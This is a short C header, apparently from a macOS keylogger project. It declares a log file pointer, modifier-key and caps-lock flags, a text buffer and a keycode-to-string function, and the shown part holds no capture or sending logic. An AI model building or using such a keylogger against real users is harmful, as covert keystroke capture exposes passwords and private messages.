#ifndef KEYLOGGER_H_
#define KEYLOGGER_H_

#include <ApplicationServices/ApplicationServices.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <Carbon/Carbon.h>

// Global Variables
FILE *logfile = NULL;
bool textMode = false;  //change between textmode/loggermode
bool shift = false;
bool cmd = false;
bool option = false;
bool ctrl = false;
bool caps = false;
bool complete =false;
char buffer[100];	//change size of array if you want textmode to print more frequently
int bufferFree = 0;

char * keyToString1 (CGKeyCode);

#endif